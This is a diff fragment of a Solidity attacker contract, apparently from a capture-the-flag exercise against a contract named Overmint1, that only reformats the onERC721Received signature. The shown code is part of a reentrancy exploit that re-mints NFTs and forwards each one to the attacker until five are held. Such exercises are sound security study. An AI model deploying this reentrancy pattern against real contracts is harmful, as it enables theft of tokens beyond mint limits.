@@ -41,10 +41,7 @@ contract AttackerContract is IERC721Receiver {
         Overmint1(victimsAddress).mint();
     }
 
-    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
-        external
-        returns (bytes4)
-    {
+    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
         if (Overmint1(msg.sender).balanceOf(attackerAddress) < 5) {
             // each time received the nft, directly send to the attacker
             Overmint1(msg.sender).safeTransferFrom(address(this), attackerAddress, tokenId);
